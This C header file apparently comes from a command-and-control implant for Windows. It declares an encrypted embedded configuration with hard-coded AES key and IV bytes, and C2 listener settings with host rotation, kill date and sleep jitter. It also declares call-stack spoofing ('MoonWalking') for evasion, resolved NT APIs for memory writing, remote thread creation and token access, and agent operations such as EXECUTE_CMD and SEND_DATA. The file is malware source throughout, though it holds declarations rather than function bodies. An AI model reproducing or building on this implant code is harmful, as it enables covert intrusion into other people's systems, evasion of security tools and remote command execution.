#pragma once
#include "Common/Common.h"
#include "evasion/stackspoof/spoof.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
 #define CONFIG_BYTES {0xdd,0x66,0xa4,0x05,0xb3,0xb9,0x44,0xfe,0x4a,0xb9,0xbd,0xd6,0x0d,0x3d,0x45,0xff,0x11,0x06,0xfb,0x33,0xb3,0x8c,0x57,0x51,0x3a,0x43,0xcf,0x18,0x6a,0xe0,0x84,0xb2,0xef,0xbc,0x57,0xe4,0x3a,0x55,0x5e,0xfa,0xaf,0x1d,0x4d,0x02,0x48,0x2e,0xbc,0x85,0xc8,0xf0,0xfa,0x96,0x49,0xa7,0xb0,0xf8,0xe3,0xf7,0x3c,0xd0,0x7b,0xf2,0xfc,0x6d,0xb7,0x1d,0x3d,0x9d,0x6d,0xb9,0xbb,0x7d,0xb4,0x58,0x87,0x83,0xdc,0x24,0xcf,0x70,0x02,0x82,0x48,0xf4,0x6e,0x14,0x60,0x68,0x00,0xe7,0x8b,0x19,0x3a,0x29,0x1b,0x51,0x29,0x63,0x74,0xbc,0x8a,0x97,0xb9,0xbd,0x89,0xc5,0x84,0x8b,0x9f,0xa2,0x3c,0xe1,0x37,0x15,0x59,0x2f,0xc2,0x75,0x41,0xa2,0xa8,0x62,0xf0,0x91,0x03,0x2e,0x1c,0x23,0xc0,0x59,0x7d,0xb2,0x77,0x3a,0x6d,0x20,0x06,0x87,0x2c,0xf4,0x0a,0x7a,0x43,0xcb,0xe6,0xa4,0x92,0xa9,0x7b,0xb8,0xf6,0x69,0xb3,0x92,0x2b,0x43,0x64,0x2a,0x19,0x3e,0x23,0xc1,0x2a,0xcd,0xd6,0x66,0xab,0x28,0xa7,0x68,0x53,0xf6,0x99,0x6e,0xa7,0xcc,0x88,0x22,0x78,0xc1,0xb4,0x4d,0xfa,0x47,0x57,0x21,0x66,0xfc,0xc4,0x4d,0x5b,0x9e,0x8c,0x1b,0xbd,0x76,0x77,0x93,0x25,0x33,0x29,0xd8,0x84,0x74,0xcd,0x64,0x0e,0x14,0x21,0xd0,0xd5,0x81,0x2d,0x81,0x20,0x01,0x50,0xd0,0x9f,0x95,0x5d,0x2c,0x16,0x82,0xf9,0x00,0x75,0x54,0x90,0xcd,0xb7,0xbc,0xe2,0x87,0x9e,0x07,0x4c,0xd4,0x86,0xac,0x3f,0xc6,0xcf,0x90,0x2a,0xf7,0x64,0x77,0xe3,0x52,0x58,0x08,0x76,0x91,0xeb,0x6c,0x58,0x0b,0x6f,0xcc,0x6d,0xd1,0xdc,0x70,0xef,0x91,0x3a,0xa1,0x16,0xf8,0xa2,0x50,0xd2,0x45,0xe4,0x8a,0xea,0xb1,0xbe,0x0a,0x73,0x09,0xb0,0x35,0xd5,0x68,0x79,0x96,0x0f,0xc3,0x39,0xe8,0xee,0xbc,0xe4,0xad,0xa6,0x2b,0xfe,0x08,0x3c,0x91,0xd5,0xaa,0x35,0xb1,0xc6,0x8a,0x5e,0xfa,0xe6,0x43,0xc4,0x3f,0x54,0x30,0x1c,0x10,0x7e,0x31,0x40,0x4a,0xf2,0x49,0x74,0x36,0x11,0xc9,0xe0,0x32,0x51,0x8c,0xdd,0x2b,0xb2,0x66,0xb1,0xb4,0xc3,0x3e,0xbe,0x01,0x8a,0xd7,0x38,0xc6,0xe0,0x69,0x92,0x1c,0x03,0x6e,0xf4,0xfd,0x18,0x3d,0xde,0xdd,0x6a,0xb3,0x22,0x25,0xe4,0xec,0xe0,0x2b,0xb1,0x6e,0x6e,0xc2,0x59,0xca,0x90,0x62,0x71,0xf2,0xbd,0xe3,0xd8,0x73,0x2a,0x72,0xe7,0xb9,0xa7,0xd1,0x6e,0x33,0x75,0x4a,0x29,0x1d,0x1e,0x41,0xdc,0x6b,0xe2,0xbc,0x27,0x1f,0xb8,0xfb,0xa5,0xca,0x6f,0xcc,0xda,0xfb,0x5d,0x4c,0x68,0x37,0x45,0x30,0x41,0x44,0xdf,0x77,0x4e,0xc3,0x2a,0xee,0x4d,0x07,0x0e,0xa2,0xd3,0x84,0x06,0x3f,0x4d,0x95,0xeb,0x5c,0xb8,0xbe,0xf4,0xe9,0x9f,0x61,0xd7,0xf4,0x32,0xce,0x42,0xc4,0x82,0xab,0x37,0xdc,0x41,0x9f,0xf2,0x42,0xdc,0xc2,0xd9,0xc8,0xcd,0x16,0xcc,0x7c,0x3b,0x13,0xc9,0x20,0xe5,0xbc,0xe0,0xf9,0x9d,0x5b,0xfa,0x61,0xf1,0xe0,0xd4,0x8e,0xea,0xc0,0x4b,0x1c,0xcf,0xd5,0x9f,0xb7,0x2c,0x77,0xf0,0x8e,0x22,0x4d,0x4e,0x0e,0x10,0xaa,0x75,0x03,0x6b,0x59,0x84,0x9d,0xb1,0x22,0xb8,0xe8,0x59,0xbd,0x53,0xca,0x31,0xec,0xc6,0xad,0x96,0x55,0x20,0x6e,0xe0,0x03,0x23,0x4e,0xc6,0xe2,0xf9,0x78,0xe2,0x98,0xb9,0x3a,0x74,0xcd,0x08,0x4e,0xda,0x3d,0x45,0xfd,0xb8,0x80,0x98,0x7d,0xb0,0x4e,0x46,0x2d,0x98,0xa2,0x11,0x21,0xe7,0x51,0x9f,0xc4,0xa7,0x82,0x4a,0x98,0x84,0x85,0x77,0xc6,0xd5,0x63,0xb9,0x49,0x8b,0x3c,0xf3,0x6f,0xdc,0x79,0xa8,0x59,0x65,0x22,0xa1,0xf6,0xa4,0xf6,0xa0,0x77,0xb9,0x2c,0x9a,0x79,0x7e,0xf0,0x7f,0xf6,0x3a,0x06,0xe8,0x0b,0x76,0xec,0x7b,0x7b,0x62,0x1e,0xbd,0x53,0x4c,0xba,0x9a,0x81,0x42,0xce,0x2b,0xca,0x28,0x04,0x5d,0x1f,0x27,0x34,0xec,0x1b,0xf7,0x87,0x51,0x59,0xb0,0x7c,0xa2,0x5c,0xa7,0xfa,0x09,0x31,0x91,0x47,0x89,0x00,0xde,0xd9,0xc2,0x39,0x8a,0x5f,0x94,0x67,0xc7,0x60,0x9f,0x9a,0x37,0x9a,0x32,0xc6,0x9c,0xc2,0x47,0xad,0x11,0x93,0x9b,0x7a,0xc5,0x97,0x7a,0x42,0xc4,0xb3,0x21,0xd0,0xaa,0x49,0xaa,0xb4,0x21,0x74,0xec,0x9d,0xd0,0x80,0x3c,0xc8,0x5c,0xcb,0x2e,0x3a,0x85,0xb4,0xa7,0x82,0x2a,0x74,0xdd,0x9f,0x89,0x00,0x95,0x14,0x23,0x1a,0x0b,0xcb,0x04,0x71,0x08,0xec,0x6d,0xab,0x61,0xe3,0x0c,0x33,0x76}
 #define CONFIG_KEY_BYTES {0xc0,0x7d,0xca,0x5e,0x12,0x14,0x43,0x7a,0x65,0xe7,0xb7,0x26,0x14,0x2c,0xde,0x5b,0xab,0x0a,0x6b,0xd2,0x6f,0x07,0x54,0xc8,0x37,0xfe,0xa2,0x25,0xe7,0x5a,0xae,0x57}
 #define CONFIG_IV_BYTES {0x77,0x35,0xda,0xae,0xb5,0xff,0x8a,0xea,0xbd,0xbd,0x6d,0xa5,0x28,0x94,0x86,0x5e}
 #define HASH_CONFIG_BYTES {0xc4,0x50,0x7d,0xa6,0x3e,0xbf,0xf4,0xfc,0xf2,0x39,0x0a,0xd5,0x26,0xef,0x13,0x4b,0xda,0x9c,0xa3,0x0c,0xab,0xf8,0xba,0xb2,0x14,0x26,0x41,0xaf,0x91,0x56,0xd1,0x36,0x56,0x5b,0x31,0x11,0x20,0x9a,0xe3,0x7d,0x4d,0xe7,0x10,0xf3,0xfe,0x0f,0x78,0xdc,0x0d,0x17,0x66,0xe4,0x1c,0x19,0xe5,0x7d,0x1e,0x0d,0x10,0x56,0xec,0xb5,0x8e,0xdc,0x03,0x5a,0x50,0x85,0xdb,0xe6,0xc2,0x0a,0x4b,0xc6,0x6d,0x72,0x97,0x62,0xf2,0xbf,0xc8,0x83,0x35,0x7c,0x20,0xdf,0xde,0xe3,0x95,0xe0,0x4e,0x01,0x9d,0x68,0x38,0xc7,0x74,0x09,0x7a,0x01,0x1d,0x36,0x54,0x82,0xae,0xa5,0x48,0xbf,0x5a,0x25,0xcf,0xeb,0x41,0xed,0x12,0x2f,0x30,0xae,0x45,0x4f,0x65,0x71,0x43,0x9c,0x8a,0xea,0x43,0x8b,0x67,0x9f,0x6d,0xd4,0x79,0xdb,0x4a,0x6d,0x86,0x0b,0x2f,0xbe,0x9e,0x56,0x9e,0xb9,0x82,0xa1,0x58,0x8a,0xf0,0xe9,0x16,0xab,0xed,0x71,0x0f,0xfe,0x1c,0xc2,0x0e,0x99,0x88,0x8e,0xe6,0x5b,0x37,0x8c,0x68,0x83,0x35,0xb8,0x25,0x84,0x0c,0x1c,0x47,0xc7,0xb7,0xa0,0x52,0x81,0x5b,0x05,0x02,0xa9,0xea,0x22,0x2c,0xe0,0xb8,0xe4,0x20,0xc2,0xbb,0xff,0xa0,0x63,0x0b,0xb0,0xae,0x6f,0x9e,0x2d,0x58,0xff,0xbe,0x93,0x8d,0x58,0xf9,0xd0,0x6c,0x50,0xc2,0x12,0x7e,0x27,0xfb,0x56,0xe3,0xe4,0x5d,0x19,0x70,0xe6,0xd5,0xae,0xa0,0xfd,0x34,0x42,0xe9,0xce,0x09,0x15,0x96,0x7b,0x86,0x8a,0x5b,0x19,0xf7,0xb5,0xe9,0x9f,0x54,0x5a,0x34,0x6b,0xfb,0x3e,0x69,0xdc,0x5c,0xbf,0x38,0x4b,0x77,0x00,0x60,0xa2,0xdb,0xa0,0xdc,0x24,0x4d,0x14,0x49,0x3c,0x6a,0xcd,0xe6,0x13,0xef,0x8f,0x3f,0x3a,0x46,0x7d,0x45,0x85,0xa8,0xc1,0x5b,0xe7,0xaa,0xb7,0xce,0x9a,0x22,0x4a,0xe8,0x80,0xd4,0x4d,0x53,0xf4,0x4d,0x97,0x62,0x78,0x32,0x1b,0x5a,0x2a,0x1c,0x2e,0x26,0x6d,0x71,0x99,0x4b,0xbb,0x9f,0x2d,0xac,0x25,0x6a,0x08,0xb0,0x38,0x02,0xec,0xd4,0x7b,0x3f,0x1c,0x75,0x87,0x15,0x7d,0x00,0xaa,0xdc,0xdd,0x54,0xc2,0x6e,0x4a,0x54,0x80,0x71,0x0a,0xd5,0xab,0xaa,0xa8,0xdd,0x4d,0x45,0xee,0xa1,0xf5,0xcd,0x52,0xb1,0x91,0x88,0xd9,0x95,0xb1,0xd4,0xff,0xad,0x2b,0x9d,0x88,0x56,0xa4,0x49,0x6f,0xa0,0x53,0xfe,0x23,0x33,0x5f,0x22,0x0c,0xd9,0x00,0x32,0xf0,0xe4,0x7d,0xb5,0x6a,0xa9,0x91,0x4b,0xdf,0x34,0x35,0x94,0x7a,0x34,0x49,0x25,0xd4,0x5f,0x58,0xc3,0x14,0x7f,0xa8,0xa8,0x38,0x8a,0x19,0xc9,0x5f,0x27,0xa1,0x7e,0x3d,0x88,0xbb,0xa2,0x4e,0x43,0x54,0x9d,0xdb,0xf3,0x0b,0x92,0xf3,0xcf,0x4c,0x93,0x29,0x30,0xd8,0x71,0x6d,0x1c,0x89,0xf9,0xdc,0xca,0xe8,0x26,0xa5,0xbf,0x99,0xbe,0x85,0x53,0xc1,0x47,0xad,0xfa,0x0d,0xa5,0xd6,0xf7,0x64,0x74,0x8f,0x74,0xf2,0xef,0x3d,0xc8,0x28,0xb6,0x30,0xa9,0x4e,0xed,0x7b,0x12,0x31,0x59,0xb6,0x5c,0x57,0x36,0x96,0x4b,0x1c,0x89,0x37,0x77,0x34,0xcb,0xb8,0x2f,0xde,0x6d,0x02,0xd3,0xd2,0x35,0x07,0x8f,0xc9,0x15,0x6f,0x05,0x18,0xde,0x16,0xe5,0xb7,0xaa,0xd7,0x29,0xb1,0x2c,0x8e,0xe0,0x56,0xcc,0x85,0xc1,0x77,0x2d,0x57,0xf6,0x96,0x24,0x81,0xd0,0x7f,0xb4,0x04,0xe9,0x28,0xed,0xbd,0xbf,0x42,0x1b,0x15,0x3e,0x2f,0xa0,0x85,0x38,0x03,0xbd,0x98,0xcb,0xed,0x03,0xa2,0xc1,0xb8,0x67,0xee,0x35,0x81,0x00,0xfc,0x03,0xff,0x9f,0xec,0xec,0x54,0xcc,0x40,0x86,0x6b,0xef,0x45,0x37,0x2d,0xa6,0x69,0xea,0x14,0x59,0xaf,0xc0,0x92,0xd6,0x39,0xaa,0x60,0x38,0xbc,0x1e,0x8e,0xac,0xab,0xbb,0xad,0x25,0x24,0x04,0x79,0xfa,0x1f,0xb0,0xc1,0xf3,0xd3,0x42,0x6f,0x0e,0x83,0xb4,0x18}
 #define HASH_KEY_BYTES {0xe7,0xb5,0xca,0x8a,0xa6,0xb4,0xdb,0x31,0x63,0x4c,0x0e,0x19,0x78,0x08,0x84,0x37,0x7e,0x5d,0xf3,0xbd,0x33,0xf2,0xc3,0x03,0xb9,0x83,0xd0,0x31,0x96,0x05,0xa8,0xeb}
 #define HASH_IV_BYTES {0xae,0x3a,0x18,0x7a,0x0d,0x40,0x0d,0x73,0x88,0x39,0x85,0x69,0x12,0xd2,0x44,0x50}

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;

typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;
	BOOL JmpRbx;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;
	t_RtlCreateTimerQueue pRtlCreateTimerQueue;
	t_NtCreateEvent pNtCreateEvent;
	t_RtlCaptureContext pRtlCaptureContext;
	t_RtlCreateTimer pRtlCreateTimer;
	t_RtlRegisterWait pRtlRegisterWait;
	t_RtlDeleteTimerQueue pRtlDeleteTimerQueue;
	t_RtlCopyMappedMemory pRtlCopyMappedMemory;
	t_NtWaitForSingleObject pNtWaitForSingleObject;
	t_NtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject;
	t_NtContinue pNtContinue;
	t_NtSetEvent pNtSetEvent;
	t_NtSetContextThread pNtSetContextThread;
	t_NtDuplicateObject pNtDuplicateObject;
	t_LdrGetProcedureAddress pLdrGetProcedureAddress;
	t_NtQueryVirtualMemory pNtQueryVirtualMemory;
	UINT64 RtlUserThreadStartHash;
	t_NtOpenThread pNtOpenThread;
	t_NtAllocateVirtualMemory pNtAllocateVirtualMemory;
	t_NtProtectVirtualMemory pNtProtectVirtualMemory;
	t_NtCreateThreadEx pNtCreateThreadEx;
	t_NtSetInformationVirtualMemory pNtSetInformationVirtualMemory;
	t_NtQueryInformationProcess pNtQueryInformationProcess;
	t_NtOpenProcess pNtOpenProcess;
	t_NtReadVirtualMemory pNtReadVirtualMemory;
	t_NtWriteVirtualMemory pNtWriteVirtualMemory;
	t_NtCreateUserProcess pNtCreateUserProcess;
	t_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx;

	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;
	t_VirtualProtect pVirtualProtect;
	t_WaitForSingleObjectEx pWaitForSingleObjectEx;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;
	t_SystemFunction032 pSystemFunction032;
	HMODULE hCryptSp;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

	//Kernelbase APIS
	HMODULE hKernelBase;
	UINT64 BaseThreadInitThunkHash;

} Win32, * pWin32;

typedef struct _AgentCMD {
	DWORD MagicValue;
	UINT CommandID;
	UINT RequestID;
	UINT DataSize;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

typedef struct _MoonWalking {
	PVOID RetAddr;
	PVOID FunctionPointer;
	PArgs Arguments;
} MoonWalking, * pMoonWalking;

typedef struct _PEINFO {
	//ImageBase Address
	PVOID ModuleBaseAddr;

	//Image Size
	DWORD ImageSize;

	//Number of Sections
	DWORD NumSections;
} PEINFO, * pPEINFO;

typedef struct _Agent {

	//win32 apis
	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;

	//active threads
	BOOL ActiveThreads;

	pPEINFO PEInfo;

	//TEB struct.
	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;

	//moonwalking structure.
	pMoonWalking Walker;

}Agent, * pAgent;

extern pAgent agent;

typedef enum  {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
	LIST_LOADED_MODULES,
	SEND_DATA,
	EXECUTE_CMD,
} Agent_Operations;


INT init_agent(PVOID RetAddress);
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();
VOID CfgAddressAdd();
BOOL CfgQueryEnforced(VOID);